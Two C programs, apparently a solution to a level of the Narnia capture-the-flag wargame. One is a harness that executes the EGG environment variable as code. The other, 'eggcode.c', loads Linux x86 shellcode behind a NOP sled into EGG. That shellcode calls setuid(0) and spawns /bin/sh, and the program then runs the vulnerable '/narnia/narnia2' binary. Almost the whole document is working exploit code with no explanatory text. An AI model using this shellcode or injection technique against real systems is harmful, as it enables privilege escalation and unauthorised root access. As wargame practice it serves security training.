/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
 
int main()
{
        int (*ret)();
 
        if(getenv("EGG")==NULL)
        {    
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
        }
        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();
 
        return 0;
}

/* eggcode.c */
#include <unistd.h>
#define NOP 0x90
 
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55"
"\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80"
"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e"
"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
 
int main(void)
{
  char shell[512];
 
  puts("Eggshell loaded into environment.\n");
  memset(shell,NOP,512);     /* fill-up the buffer with NOP */
/* fill-up the shellcode on the second half to the end of buffer */
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  /* set the environment variable to */
  /* EGG and shell as its value, rewrite if needed */
  setenv("EGG", shell, 1);
  /* modify the variable */
  putenv(shell);
  /* invoke the bash */
  system("/narnia/narnia2");
  return 0;
}